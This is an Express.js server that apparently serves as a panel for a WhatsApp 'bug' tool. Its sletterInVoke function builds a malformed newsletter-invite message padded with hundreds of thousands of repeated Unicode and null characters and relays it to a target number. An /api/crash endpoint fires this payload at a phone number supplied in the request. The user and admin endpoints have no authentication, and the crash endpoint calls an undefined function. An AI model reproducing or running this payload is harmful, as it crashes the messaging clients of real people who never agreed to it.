const express = require("express");
const fs = require("fs");
const crypto = require("crypto");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static("public"));

const loadUsers = () => JSON.parse(fs.readFileSync("./users.json", "utf8"));
const saveUsers = (data) => fs.writeFileSync("./users.json", JSON.stringify(data, null, 2));

app.post("/api/add-user", (req, res) => {
  const { phone, role } = req.body;
  const users = loadUsers();
  users.push({ phone, role });
  saveUsers(users);
  res.json({ success: true, message: "User added." });
});

app.post("/api/add-admin", (req, res) => {
  const { phone } = req.body;
  const users = loadUsers();
  users.push({ phone, role: "admin" });
  saveUsers(users);
  res.json({ success: true, message: "Admin added." });
});

app.post("/api/change-role", (req, res) => {
  const { phone, newRole } = req.body;
  const users = loadUsers();
  const user = users.find(u => u.phone === phone);
  if (user) {
    user.role = newRole;
    saveUsers(users);
    res.json({ success: true, message: "Role updated." });
  } else {
    res.status(404).json({ success: false, message: "User not found." });
  }
});

// TARO FUNCTIONMY

async function sletterInVoke(sock, target) {
  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "33333333333333333@newsletter",
            newsletterName: "Hallo Izin Push Kontak" + "ી".repeat(120000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
            inviteExpiration: Date.now() + 1814400000,
          },
        },
      },

      nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: "{}",
          },
          {
            name: "galaxy_message",
            paramsJson: {
              screen_2_OptIn_0: true,
              screen_2_OptIn_1: true,
              screen_1_Dropdown_0: "nullOnTop",
              screen_1_DatePicker_1: "1028995200000",
              screen_1_TextInput_2: "null@gmail.com",
              screen_1_TextInput_3: "94643116",
              screen_0_TextInput_0: "\u0000".repeat(500000),
              screen_0_TextInput_1: "SecretDocu",
              screen_0_Dropdown_2: "#926-Xnull",
              screen_0_RadioButtonsGroup_3: "0_true",
              flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s.",
            },
          },
        ],
      },

      contextInfo: {
        mentionedJid: ["0@s.whatsapp.net"],
        groupMentions: [
          {
            groupJid: "0@s.whatsapp.net",
            groupSubject: "#Syonx-Tzy",
          },
        ],
      },
    };

    await sock.relayMessage(target, message, {
      userJid: target,
      participant: { jid: target },
    });

  } catch (err) {
    console.error("Error sending VampireBugIns:", err);
  }
}

//BATES FUNCTION 

app.post("/api/crash", async (req, res) => {
  const { target } = req.body;
  if (!target) {
    return res.status(400).json({ success: false, message: "Target number is required." });
  }

  try {
    await InvisibleHome(target, {}); // Dummy sock untuk testing lokal //InvisibleHome ubah ke nama asyn functionnya
    res.json({ success: true, message: `Bug terkirim ke ${target}` });
  } catch (err) {
    res.status(500).json({ success: false, message: "Gagal kirim bug", error: err.message });
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
